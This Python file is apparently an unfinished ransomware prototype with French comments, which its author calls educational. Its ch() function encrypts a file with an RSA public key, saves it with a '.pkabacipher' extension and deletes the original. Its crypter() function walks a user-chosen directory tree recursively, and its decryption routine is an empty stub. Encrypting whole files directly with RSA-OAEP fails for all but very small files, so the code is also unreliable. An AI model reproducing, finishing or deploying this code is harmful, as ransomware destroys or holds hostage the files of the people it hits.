"""
Coded By Alexis Pondo
Github: http://github.com/alexispondo/
Linkedin: https://www.linkedin.com/in/alexis-pondo/

Note: Ce programe est à but éducatif, en effet il a été écrit pour comprendre le fonctionnement des ransomware, comment le chiffrement sous-jacent fonctionne et comment il se propage sur une machine.
      Je ne suis en aucun cas reponsable de tous ce que vous ferrez avec.
"""

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
import os

def generer_private_key(size = 2048):
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=int(size),
    )
    return private_key

def load_private_key(private_key_file):
    with open(private_key_file, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            #password=b'mypassword',
            password=None,
        )
    return private_key

def serialyse_private_key(private_key, output):
    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        #encryption_algorithm=serialization.BestAvailableEncryption(b'mypassword')
        encryption_algorithm=serialization.NoEncryption()
    )
    with open(output, "wb") as private_key:
        private_key.write(pem)


def get_public_key(private_key):
    public_key = private_key.public_key()
    return public_key

def serialize_public_key(public_key, output):
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    with open(output, "wb") as public_key:
        public_key.write(pem)

def load_public_key(public_key_file):
    with open(public_key_file, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read()
        )
    return public_key

def ch(public_key, file):
    with open(file, "rb") as f:
        message = f.read()

    ciphertext = public_key.encrypt(
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    new_file = file + ".pkabacipher"
    with open(new_file, "wb") as nf:
        nf.write(ciphertext)
    os.remove(file)


def crypter(message):
    print(os.getcwd())
    print("\nVous avez choisi de chiffrer les fichier du disque")
    print("Veuillez entrer le dossier racine à partir duquel les fichiers serons chiffrer de manière recursive")
    print("ex: D:\\my_dir\\, /home/user/dir/ ...")
    dir = str(input("Entrer le chemin du dossier > "))
    if os.path.isdir(dir):
        os.chdir(dir)
        print(os.getcwd())

        for (current_dir, list_dir, files) in os.walk(dir):
            for f in files:
                print(current_dir + "/" + f)

            #print((current_dir, list_dir, files))
    else:
        print("\nDésolé vous avez entrez un dossier inexistant :(")

def decrypter(message_crypter):
    pass


def main():
    crypter("pondo")


#main()


"""
def test_function():
    priv_k = generer_private_key(4096)
    print("priv = ", priv_k)
    pub_k = get_public_key(priv_k)
    print("pub = ", pub_k)
    serialize_public_key(pub_k, "public")
    serialyse_private_key(priv_k, "private")

    print("\n\nChargement...")
    priv_k1 = load_private_key("private")
    print("priv1 = ", priv_k1)

    pub_k1 = load_public_key("public")
    print("pub1 = ", pub_k1)

    serialize_public_key(pub_k1, "public1")
    serialyse_private_key(priv_k1, "private1")
"""